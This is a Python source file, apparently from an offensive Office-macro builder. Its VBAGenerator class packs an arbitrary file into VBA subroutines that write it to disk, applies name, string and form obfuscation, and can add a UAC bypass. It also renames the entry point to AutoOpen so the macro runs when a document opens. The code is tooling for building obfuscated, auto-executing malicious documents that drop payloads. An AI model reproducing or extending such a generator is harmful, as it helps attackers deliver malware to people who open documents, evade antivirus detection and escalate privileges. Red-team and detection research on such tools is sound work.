#!/usr/bin/env python
# encoding: utf-8

import logging
from modules.payload_builder import PayloadBuilder
import shutil
import os
from modules.obfuscate_names import ObfuscateNames
from modules.obfuscate_form import ObfuscateForm
from modules.obfuscate_strings import ObfuscateStrings
from modules.uac_bypass import UACBypass
from vbLib import WriteBytes


class VBAGenerator(PayloadBuilder):
    """ Module used to generate VBA file from working dir content"""
    
          
    def embedFile(self):
        """
        Embed the content of  self.embeddedFilePath inside the generated target file
        """
        logging.info("   [-] Embedding file %s..." % self.embeddedFilePath)
        if not os.path.isfile(self.embeddedFilePath):
            logging.error("   [!] Could not find %s " % self.embeddedFilePath)
            raise Exception("Invalid file path")
            return
        
        infile = open(self.embeddedFilePath, 'rb')
        packedFile = ""
        
        countLine = 0
        countSubs = 1
        line = ""
        packedFile += "Sub DumpFile%d(objFile) \n" % countSubs
            
        while True:
            inbyte = infile.read(1)
            if not inbyte:
                break
            if len(line) > 0:
                line = line + " "
            line = line + "%d" % ord(inbyte)
            if len(line) > 800:
                packedFile += "\tWriteBytes objFile, \"%s\" \n" % line
                line = ""
                countLine += 1
                if countLine > 99:
                    countLine = 0
                    packedFile += "End Sub \n"
                    packedFile += " \n"
                    countSubs += 1
                    packedFile += "Sub DumpFile%d(objFile) \n" % countSubs
                     
        if len(line) > 0:
            packedFile += "\tWriteBytes objFile, \"%s\" \n" % line
            
        packedFile += "End Sub \n"
        packedFile += " \n"
        packedFile += "Sub DumpFile(strFilename) \n"
        packedFile += "\tDim objFSO \n"
        packedFile += "\tDim objFile \n"
        packedFile += " \n"
        packedFile += "\tSet objFSO = CreateObject(\"Scripting.FileSystemObject\") \n"
        packedFile += "\tSet objFile = objFSO.OpenTextFile(strFilename, 2, true) \n"
        for iIter in range(1, countSubs+1):
            packedFile += "\tDumpFile%d objFile \n" % iIter
        packedFile += "\tobjFile.Close \n"
        packedFile += "End Sub \n"
    
        newContent = WriteBytes.VBA + "\n"
        newContent += packedFile + "\n"       
        self.addVBAModule(newContent)
        
        infile.close()
        return 
    
    
        
    def vbTransformAndObfuscate(self):
        """ 
        Call this method to apply transformation and obfuscation on the content of temp directory 
        This method does obfuscation for all VBA and VBA like types
        
        """
        
        # Enable UAC bypass
        if self.mpSession.uacBypass:
            uacBypasser = UACBypass(self.mpSession)
            uacBypasser.run()
        
        # Macro obfuscation
        if self.mpSession.obfuscateNames:
            obfuscator = ObfuscateNames(self.mpSession)
            obfuscator.run()
        # Mask strings
        if self.mpSession.obfuscateStrings:
            obfuscator = ObfuscateStrings(self.mpSession)
            obfuscator.run()
        # Macro obfuscation
        if self.mpSession.obfuscateForm:
            obfuscator = ObfuscateForm(self.mpSession)
            obfuscator.run() 


    
    def check(self):
        return True
    
    
    def printFile(self):
        """ Display generated code on stdout """
        logging.info(" [+] Generated VB code:\n")
        if len(self.getVBAFiles())==1: 
            vbaFile = self.getMainVBAFile() 
            with open(vbaFile,'r') as f:
                print(f.read())
        else:
            logging.info("   [!] More then one VB file generated")
            for vbaFile in self.getVBAFiles():
                with open(vbaFile,'r') as f:
                    print(" =======================  %s  ======================== " % vbaFile)
                    print(f.read())
                    
    
    def generate(self):
        if len(self.getVBAFiles())>0:
            logging.info(" [+] Analyzing generated VBA files...")
            if len(self.getVBAFiles())==1:
                shutil.copy2(self.getMainVBAFile(), self.outputFilePath)
                logging.info("   [-] Generated VBA file: %s" % self.outputFilePath) 
            else:
                logging.info("   [!] More then one VBA file generated, files will be copied in same dir as %s" % self.outputFilePath)
                for vbaFile in self.getVBAFiles():
                    shutil.copy2(vbaFile, os.path.join(os.path.dirname(self.outputFilePath),os.path.basename(vbaFile)))
                    logging.info("   [-] Generated VBA file: %s" % os.path.join(os.path.dirname(self.outputFilePath),os.path.basename(vbaFile)))   
                    
    
    def getAutoOpenVbaFunction(self):
        return "AutoOpen"
            
    def resetVBAEntryPoint(self):
        """
        If macro has an autoopen like mechanism, this will replace the entry_point with what is given in newEntrPoin param
        Ex for Excel it will replace "Sub AutoOpen ()" with "Sub Workbook_Open ()"
        """
        mainFile = self.getMainVBAFile()
        if mainFile != "" and  self.startFunction is not None:
            if self.startFunction != self.getAutoOpenVbaFunction():
                logging.info("   [-] Changing auto open function from %s to %s..." % (self.startFunction, self.getAutoOpenVbaFunction()))
                #1 Replace line in VBA
                f = open(mainFile)
                content = f.readlines()
                f.close
                for n,line in enumerate(content):
                    if line.find(" " + self.startFunction) != -1:  
                        #logging.info("     -> %s becomes %s" %(content[n], self.getAutoOpenVbaSignature()))  
                        content[n] = self.getAutoOpenVbaSignature() + "\n"
                f = open(mainFile, 'w')
                f.writelines(content)
                f.close()   
                # 2 Change  cure module start function
                self._startFunction = self.getAutoOpenVbaFunction()
                            
    